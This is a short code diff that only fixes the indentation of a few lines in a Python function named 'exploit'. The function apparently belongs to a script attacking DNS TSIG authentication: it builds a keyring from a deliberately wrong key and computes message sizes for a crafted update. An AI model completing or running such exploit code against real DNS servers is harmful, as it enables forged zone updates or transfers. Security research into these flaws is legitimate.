@@ -37,9 +37,9 @@ def get_update(zone, size_to_absorb):
 
 
 def exploit(host, zone, keyname, fudge=300):
-keyring = dns.tsigkeyring.from_text({
-    keyname: 'wrong_key'.encode('base64')
-})
+    keyring = dns.tsigkeyring.from_text({
+        keyname: 'wrong_key'.encode('base64')
+    })
     ts = time()
     sz = 12 + sum(len(e) + 1 for e in (zone).split('.')) + 1 + 4
 
